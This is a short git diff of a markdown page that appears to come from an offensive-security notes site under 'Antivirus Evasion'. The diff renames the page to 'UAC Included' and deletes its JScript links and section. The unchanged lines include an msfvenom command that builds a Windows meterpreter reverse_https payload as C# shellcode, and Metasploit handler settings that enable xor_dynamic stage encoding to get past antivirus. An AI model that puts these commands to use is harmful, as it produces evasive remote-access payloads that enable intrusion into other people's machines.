@@ -1,13 +1,12 @@
 ---
-title: UAC
+title: UAC Included
 layout: default
 parent: Antivirus Evasion
 nav_order: 3
 ---
 
 ## Powershell
-[Powershell to load DLL](#powershell-to-load-dll)\
-[JScript](#jscript)
+[Powershell to load DLL](#powershell-to-load-dll)
 
 Please note that this only works in Powershell (not from Word Macro)
 
@@ -35,8 +34,7 @@ exploit
 
 
 ## Powershell to load DLL:
-[Powershell](#powershell)\
-[JScript](#jscript)
+[Powershell](#powershell)
 
 1. Generate msfvenom with:\
 `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`
@@ -261,8 +259,3 @@ set EnableStageEncoding true
 set StageEncoder x64/xor_dynamic
 exploit
 ```
-
-## Jscript
-[Powershell](#powershell)\
-[Powershell to load DLL](#powershell-to-load-dll)
-
